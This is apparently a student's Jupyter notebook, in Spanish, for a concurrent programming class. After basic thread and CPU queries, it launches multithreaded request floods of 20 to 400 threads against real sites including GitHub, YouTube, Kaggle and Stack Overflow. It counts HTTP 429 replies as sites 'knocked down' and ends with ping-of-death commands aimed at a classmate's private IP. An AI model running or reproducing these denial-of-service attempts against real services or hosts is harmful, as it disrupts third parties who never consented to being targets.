{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<h1 style = \"text-align:center\"> <b>Programación Concurrente y Distribuida </b> </h1>\n",
    "\n",
    "\n",
    "<a href=\"github.com/mariasol210\">\n",
    "    <img src=\"../firma.png\" title = \"Maria Sol Torres Lopez 21940130\" alt=\"Maria Sol Torres Lopez\" width=\"150\" height=\"150\" style=\"float: left;vertical-alig: middle\">\n",
    "    <img src=\"../uem.png\" title= \"M23\" alt=\"UE\" width=\"280\" height=\"280\" style=\"float: right;vertical-alig:middle\">"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "---\n",
    "<h2 style=\"text-align:center;\"> <b> CLASS PARTICPATION 1 </b> </h2>\n",
    "\n",
    "---\n",
    "\n",
    "## **Importar Modulos**"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "import os"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Para trabajar con hilos\n",
    "import threading"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## **Interactuar con el OS**"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 3) El numero de proceso que lo maneja y cuantos procesos estan activos"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "El proceso que esta manejando este programa es: 28418\n"
     ]
    }
   ],
   "source": [
    "print(\"El proceso que esta manejando este programa es:\", os.getpid())"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Se han lanzado 5 hilos\n"
     ]
    }
   ],
   "source": [
    "print(\"Se han lanzado {0} hilos\".format(threading.activeCount()))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 4) Cuántos hilos activos tienen lanzados en este momento?"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Hilos activos en el momento de ejecución: (resaltado en amarillo)\n"
     ]
    }
   ],
   "source": [
    "print(\"Hilos activos en el momento de ejecución: (resaltado en amarillo)\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<img src=\"hilosActivos.png\" alt=\"captura de los hilos activos\" width=\"750\" height=\"750\" style=\"float: left;vertical-alig: middle\">"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 5) Cuántos cores lógicos tiene su equipo ?"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 33,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Este equipo tiene un total de 4 cores logicos\n"
     ]
    }
   ],
   "source": [
    "print(\"Este equipo tiene un total de {0} cores logicos\".format(os.cpu_count()))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 6) Cuántos cores fisicos tiene su equipo ?"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 32,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Este equipo tiene un total de 2.0 cores fisicos \n"
     ]
    }
   ],
   "source": [
    "print(\"Este equipo tiene un total de {0} cores fisicos \".format(os.cpu_count()/2))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 7) Enumere e identifique los hilos lanzados ?"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<_MainThread(MainThread, started 4629544448)>\n",
      "<Thread(Thread-2, started daemon 123145412964352)>\n",
      "<Heartbeat(Thread-3, started daemon 123145429753856)>\n",
      "<HistorySavingThread(IPythonHistorySavingThread, started 123145447616512)>\n",
      "<ParentPollerUnix(Thread-1, started daemon 123145464942592)>\n"
     ]
    }
   ],
   "source": [
    "for t in threading.enumerate():\n",
    "    print(t)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Tenemos un hilo principal llamado Main Thread, el segundo hilo se llama Thread 2 y es de tipo demonio, el tercer hilo llamado HeartBeat también es Daemon y es el que está determinando si el sistema sigue funcionando. El cuarto hilo tambien es demonio y hace el siguimiento del historial cuando grabamos usado por JupyterLab. Por último, el quinto hilo es el Parent y también es demonio"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## **Ataques con hilos**"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Este va a ser el target de mis hilos\n",
    "def cpu():\n",
    "    while True:\n",
    "        pass"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Para imprimir las respuestas de los ataques\n",
    "def printRespuesta(link):\n",
    "    ataque= requests.get(link)\n",
    "    print('Respuesta: ', ataque)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 8) Lance un ataque usando 20 hilos a : https://github.com/sukuzhanay"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "Ataque usando 20 hilos \n"
     ]
    }
   ],
   "source": [
    "link = 'https://github.com/sukuzhanay'\n",
    "\n",
    "def ataqueGithub():\n",
    "    ataque = requests.get(link)\n",
    "    ataque\n",
    "    \n",
    "print('\\nAtaque usando 20 hilos ')\n",
    "for i in range(20):\n",
    "    threading.Thread(target=ataqueGithub).start()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Respuesta del ataque a github"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Respuesta:  <Response [200]>\n"
     ]
    }
   ],
   "source": [
    "printRespuesta(link)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 9) Lance un ataque usando 30 hilos a : https://www.youtube.com/channel/UCEXbXdeafAjBahYK2hoQJFg"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "Ataque usando 30 hilos \n"
     ]
    }
   ],
   "source": [
    "link = 'https://www.youtube.com/channel/UCEXbXdeafAjBahYK2hoQJFg'\n",
    "\n",
    "def ataqueYouTube():\n",
    "    ataque = requests.get(link)\n",
    "    ataque\n",
    "    \n",
    "print('\\nAtaque usando 30 hilos ')\n",
    "for i in range(30):\n",
    "    threading.Thread(target=ataqueYouTube).start()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Respuesta del ataque a YouTube"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {
    "jupyter": {
     "source_hidden": true
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Respuesta:  <Response [200]>\n"
     ]
    }
   ],
   "source": [
    "printRespuesta(link)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 10) Lance un ataque usando 50 hilos a : https://rpubs.com/christian_sucuzhanay"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "Ataque usando 50 hilos \n"
     ]
    }
   ],
   "source": [
    "link = 'https://rpubs.com/christian_sucuzhanay'\n",
    "    \n",
    "def ataqueRpubs():\n",
    "    ataque = requests.get(link)\n",
    "    ataque\n",
    "\n",
    "print('\\nAtaque usando 50 hilos ')\n",
    "for i in range(50):\n",
    "    threading.Thread(target=ataqueRpubs).start()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Respuesta del ataque a Rpubs"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {
    "jupyter": {
     "source_hidden": true
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Respuesta:  <Response [200]>\n"
     ]
    }
   ],
   "source": [
    "printRespuesta(link)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 11) Lance un ataque usando 100 hilos a : https://rpubs.com/christian_sucuzhanay"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "Ataque usando 100 hilos \n"
     ]
    }
   ],
   "source": [
    "print('\\nAtaque usando 100 hilos ')\n",
    "for i in range(100):\n",
    "    threading.Thread(target=ataqueRpubs).start()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Respuesta del ataque a Rpubs"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "metadata": {
    "jupyter": {
     "source_hidden": true
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Respuesta:  <Response [200]>\n"
     ]
    }
   ],
   "source": [
    "printRespuesta(link)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 12) Lance un ataque usando 200 hilos a : https://www.kaggle.com/sucuzhanay"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "Ataque usando 200 hilos \n"
     ]
    }
   ],
   "source": [
    "link = 'https://www.kaggle.com/sukuzhanay'\n",
    "    \n",
    "def ataqueKaggle():\n",
    "    ataque = requests.get(link)\n",
    "    ataque\n",
    "\n",
    "print('\\nAtaque usando 200 hilos ')\n",
    "for i in range(200):\n",
    "    threading.Thread(target=ataqueKaggle).start()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Respuesta del ataque a Kaggle"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "metadata": {
    "jupyter": {
     "source_hidden": true
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Respuesta:  <Response [429]>\n"
     ]
    }
   ],
   "source": [
    "printRespuesta(link)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 13) Lance un ataque usando 300 hilos a : https://stackoverflow.com/story/christian-sucuzhanay-arevalo"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "Ataque usando 300 hilos \n"
     ]
    }
   ],
   "source": [
    "link = 'https://stackoverflow.com/story/christian-sucuzhanay-arevalo'\n",
    "    \n",
    "def ataqueStackoverflow():\n",
    "    ataque = requests.get(link)\n",
    "    ataque\n",
    "\n",
    "print('\\nAtaque usando 300 hilos ')\n",
    "for i in range(300):\n",
    "    threading.Thread(target=ataqueStackoverflow).start()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Respuesta del ataque a Stackoverflow"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "metadata": {
    "jupyter": {
     "source_hidden": true
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Respuesta:  <Response [429]>\n"
     ]
    }
   ],
   "source": [
    "printRespuesta(link)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 14) Lance un ataque usando 400 hilos a : https://eburnout.com/"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "Ataque usando 400 hilos \n"
     ]
    }
   ],
   "source": [
    "link = 'https://eburnout.com/'\n",
    "\n",
    "def ataqueEburnout():\n",
    "    ataque = requests.get(link)\n",
    "    ataque\n",
    "\n",
    "print('\\nAtaque usando 400 hilos ')\n",
    "for i in range(400):\n",
    "    threading.Thread(target=ataqueEburnout).start()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Respuesta del ataque a eBurnOut"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "metadata": {
    "jupyter": {
     "source_hidden": true
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Respuesta:  <Response [200]>\n"
     ]
    }
   ],
   "source": [
    "printRespuesta(link)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 15) Qué paginas logró \"tumbar\"?"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Se tumbó a Kaggle y Stackoverflow"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 16) Lance 20 hilos con el ping de la muerte al equipo de su compañero"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "% ping 127.0.0.0 -l 65500 -w 1 -n 1"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "% ping 10.34.80.189 -l 65500 -w 1 -n 1"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
